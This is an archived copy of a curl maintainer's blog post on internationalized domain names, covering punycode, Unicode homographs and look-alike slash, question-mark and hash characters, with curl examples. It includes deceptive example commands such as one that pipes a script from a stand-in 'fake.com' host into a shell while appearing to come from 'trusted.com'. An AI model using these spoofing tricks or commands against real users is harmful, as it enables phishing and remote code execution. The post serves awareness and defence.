<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://daniel.haxx.se/blog/2022/12/14/idn-is-crazy/">Original</a>
    <h1>IDN is crazy</h1>
    
    <div id="readability-page-1" class="page"><div>
		
<p>IDN, <a href="https://en.wikipedia.org/wiki/Internationalized_domain_name">International Domain Names</a>, is the concept that lets us register and use <em>international</em> characters in domain names, and by international we of course mean characters outside of the ASCII range.</p>



<p>Recently I have fought some battles against IDN and IDN decoding so I felt this urge to write a lot of words about it to help me in my healing process and maybe mend my scars a little. I am not sure it worked but at least I feel a little better now.</p>



<p>(<em>If WordPress had a more sensible Unicode handling, this post would have nicer looking examples. I can enter Unicode fine, but if I save the post as a draft and come back to it later, most of the Unicodes are replaced by question marks! Because of this, the examples below are not all using the exact Unicode symbols the text speaks of.</em>)</p>



<h2>Punycode</h2>



<p>IDN works by having apps convert the Unicode name into the ASCII based <em><a href="https://en.wikipedia.org/wiki/Punycode">punycode</a></em> version under the hood, and then use that with DNS etc. The puny code version of “räksmörgås.se” becomes “<code>xn--rksmrgs-5wao1o.se</code>“. A pretty clever solution really.</p>



<h2>The good side</h2>



<p>Using this method, we can use URLs like https://räksmörgås.se or even ones written entirely in Arabic, Chinese or Cyrillic etc in compliant applications like browsers and curl. Even the TLD can be “international”. The whole Unicode range is at our disposal and this is certainly a powerful tool and allows a lot of non-Latin based languages to actually be used for domain names.</p>



<p>Gone are the days when everything needed to be converted to Latin.</p>



<h2>There are many ugly sides</h2>



<p>Already from the start of the IDN adventure, people realized that Unicode contains a lot of symbols that are identical or almost identical to other symbols, so you can make up the perfect fake sites that provide no or very little visual distinction from the one you try to look like.</p>



<h3>Homographs</h3>



<p>I remember early demonstrations using paypal.com vs paypal.com, where the second name was actually using a completely different letter somewhere. Perhaps for example the ‘l’ used the <em>Cyrillic Capital Letter Iota</em> (<a href="https://www.compart.com/en/unicode/U+A646">U+A646</a>) – which in most fonts is next to indistinguishable from the lower case ASCII letter L. This is commonly referred to as an <a href="https://en.wikipedia.org/wiki/IDN_homograph_attack">IDN Homograph attack</a>. They look identical, but are different.</p>



<p>This concept of replacing one or more characters by  identical glyphs is mitigated in part in browsers, which switch to showing the punycode version in the URL bar instead of the Unicode version – when they think it is mandated. Domain names are not allowed to mix scripts for different languages, and if they do the IDNs names are displayed using their punycode.</p>



<p>This of course does not prevent someone from promoting a command line curl use that uses it, and maybe encourage use of it:</p>



<pre>curl https://example.com/api/</pre>



<p>If you would copy and paste such an example, you would find that curl cannot resolve <code>xn--exampe-7r6v.com</code>! Or if you use the same symbol in the curl domain name:</p>



<pre>$ curl https://curl.se
curl: (6) Could not resolve host: xn--cur-ju2l.se</pre>



<h3>Heterograph?</h3>



<p>Similar to the previous confusion, there’s another version of the homograph attack and this is one that stayed under the radar for me for a long time. I suppose we can call it a Heterograph attack, as it makes names look different when they are in fact the same.</p>



<p>The IDN system is also “helpfully” replacing some similarly looking glyphs with their ASCII counterparts. I use quotes around helpfully, because I truly believe that this generally causes more harm and pain in users’ lives than it actually does good.</p>



<p>A user can provide a name using an IDN version of one or more characters within the name, and that name will then get translated into a regular non-IDN name and then get used normally from then on. I realize this may sound complicated, but it really is not.</p>



<p>Let me show you a somewhat crazy example (shown as an image to prevent WordPress from interfering). You want to use a curl command line to get the contents of the URL <code>https://curl.se</code> but since you are wild and crazy, you spice up things and replace every character in the domain name with a Unicode replacement:</p>


<div>
<figure><img decoding="async" loading="lazy" width="489" height="76" src="https://daniel.haxx.se/blog/wp-content/uploads/2022/12/Screenshot-2022-12-13-at-17-54-06-Untitled-document-Google-Docs.png" alt=""/></figure></div>


<p>If you would copy and paste this command line into your terminal, it works. Everyone can see that this domain name looks crazy, but it does not matter. It still works. It also works in browsers. A browser will however immediately show the translated version in the URL bar.</p>



<p>This method can be used for avoiding filters and has several times been used to find flaws in curl’s HSTS handling. Surely other tools can be tricked and fooled using variations of this as well.</p>



<p>This works because the characters used in the domain name are automatically <em>converted</em> to their ASCII counterparts by the IDN function. And since there is no IDN characters left after the conversion, it does not end up punycoded but instead it is plain old ASCII again.  Those Unicode symbols simply translate into “curl.se”. </p>



<p>The example above also replaces the period before “se” with the Halfwidth Ideographic Full Stop (<a href="https://www.compart.com/en/unicode/U+FF61">U+FF61</a>).</p>



<p>Replacing the dot this way works as well. “Helpful”.</p>



<h4>A large set to pick from</h4>



<p>If we look at the letter ‘c’ alone, it has a huge number of variations in the Unicode set that all translate into ASCII ‘c’ by the IDN conversion. I found at least these <em>fifteen</em> variations that all convert to c:</p>



<ul>
<li>Fullwidth Latin Small Letter C (<a href="https://www.compart.com/en/unicode/U+FF43">U+FF43</a>)</li>



<li>Modifier Letter Small C (<a href="https://www.compart.com/en/unicode/U+1D9C">U+1D9C</a>)</li>



<li>Small Roman Numeral One Hundred (<a href="https://www.compart.com/en/unicode/U+217D">U+217D</a>)</li>



<li>Mathematical Bold Small C (<a href="https://www.compart.com/en/unicode/U+1D41C">U+1D41C</a>)</li>



<li>Mathematical Italic Small C (<a href="https://www.compart.com/en/unicode/U+1D450">U+1D450</a>)</li>



<li>Mathematical Bold Italic Small C (<a href="https://www.compart.com/en/unicode/U+1D484">U+1D484</a>)</li>



<li>Mathematical Script Small C (<a href="https://www.compart.com/en/unicode/U+1D4B8">U+1D4B8</a>)</li>



<li>Mathematical Fraktur Small C (<a href="https://www.compart.com/en/unicode/U+1D520">U+1D520</a>)</li>



<li>Mathematical Double-Struck Small C (<a href="https://www.compart.com/en/unicode/U+1D554">U+1D554</a>)</li>



<li>Mathematical Bold Fraktur Small C (<a href="https://www.compart.com/en/unicode/U+1D588">U+1D588</a>)</li>



<li>Mathematical Sans-Serif Small C (<a href="https://www.compart.com/en/unicode/U+1D5BC">U+1D5BC</a>)</li>



<li>Mathematical Sans-Serif Bold Small C (<a href="https://www.compart.com/en/unicode/U+1D5F0">U+1D5F0</a>)</li>



<li>Mathematical Sans-Serif Italic Small C (<a href="https://www.compart.com/en/unicode/U+1D624">U+1D624</a>)</li>



<li>Mathematical Sans-Serif Bold Italic Small C (<a href="https://www.compart.com/en/unicode/U+1D658">U+1D658</a>)</li>



<li>Mathematical Monospace Small C (<a href="https://www.compart.com/en/unicode/U+1D68C">U+1D68C</a>)</li>
</ul>



<p>The Unicode consortium even has this collection of <a href="https://util.unicode.org/UnicodeJsps/confusables.jsp">“confusables”</a> which also features a tool that lets you visualize a name done with various combinations of Unicode homographs. I entered curl, and here’s a subset of the alternatives it showed me:</p>


<div>
<figure><a href="https://daniel.haxx.se/blog/wp-content/uploads/2022/12/Screenshot-2022-12-13-at-23-14-42-Unicode-Utilities-Confusables.png"><img decoding="async" loading="lazy" width="1271" height="726" src="https://daniel.haxx.se/blog/wp-content/uploads/2022/12/Screenshot-2022-12-13-at-23-14-42-Unicode-Utilities-Confusables.png" alt=""/></a></figure></div>


<p>Supposedly, all of those combinations can be used as IDN names and they will work.</p>



<h3>Homographic slash</h3>



<p>The Fraction Slash (<a href="https://www.compart.com/en/unicode/U+2044">U+2044</a>) looks very much like an ASCII slash,  but is not. Use it instead of a slash to make the URL look like host name with a slash, but then add your own domain name after it:</p>



<pre>$ curl https://google.com/.curl.se
curl: (6) Could not resolve host: google.xn--com-qt0a.curl.se</pre>



<p>If you paste that URL into a browser, it will switch to punycode mode, but still. The next example also shows as punycode when I try it in Firefox.</p>



<h3>Homographic question mark</h3>



<p>If you want an alternative to the slash-looking non-slash symbol, you can also trick a user with something that looks similar to a question mark. The Latin Capital Letter Glottal Stop (<a href="https://www.compart.com/en/unicode/U+0241">U+0241</a>) for example is a symbol that looks confusingly similar to a question mark in many fonts:</p>



<pre>$ curl https://google.com?.curl.se
curl: (6) Could not resolve host: google.xn--com-sqb.curl.se</pre>



<p>In both the slash and these question mark examples, I could of course set up a host that would have some clever content.</p>



<h2>Homographic fragment</h2>



<p>The Viewdata Square (<a href="https://www.compart.com/en/unicode/U+2317">U+2317</a>) can be used to mimic a hash symbol.</p>



<pre>$ curl https://trusted.com#.fake.com
curl: (6) Could not resolve host: trusted.xn--com-d62a.fake.com</pre>



<h2>Tricking a curl user</h2>



<p>curl users will not get the punycode version shown in a URL bar so we might be easier to fool by these stunts. If the user doesn’t carefully check perhaps the verbose output, they might very well be fooled. </p>



<p>HTTPS does not save us either, because nothing prevents an impostor from creating this domain name and having a perfectly valid certificate for it.</p>



<p>A really sneaky command line to trick users to download something from a site fake site, while appearing to download from a known and trusted one can look like this:</p>



<pre>$ curl https://trusted.com?.fake.com/file -O</pre>



<p>… but since the slash on the right side of ‘com’ is a Unicode symbol, and the curl tool supports IDN, it actually gets a page from “fake.com”, As owner of fake.com, we would only need to make sure that <code>https://trusted.xn--com-qt0a.fake.com</code> exists and works.</p>



<p>A real world attack could even have a redirect to the real trusted.com domain for 99% of the cases or maybe for all cases where the user agent or source IP are not the ones we are looking for.</p>



<p>The old pipe from curl to shell thing is of course also an effective trick. It looks like you get the script from trusted.com using HTTPS and everything:</p>



<pre>$ curl https://trusted.com?.fake.com/script | sh</pre>



<h2>More</h2>



<p>This blog post is not meant to be a conclusive list of <em>all</em> problems or possible IDN trickery you can play with. I hear for example that mixing right-to-left with left-to-right in the same domain name is another treasure trove of confusions ready for your further explorations.</p>



<p>Game on!</p>
	</div></div>
  </body>
</html>
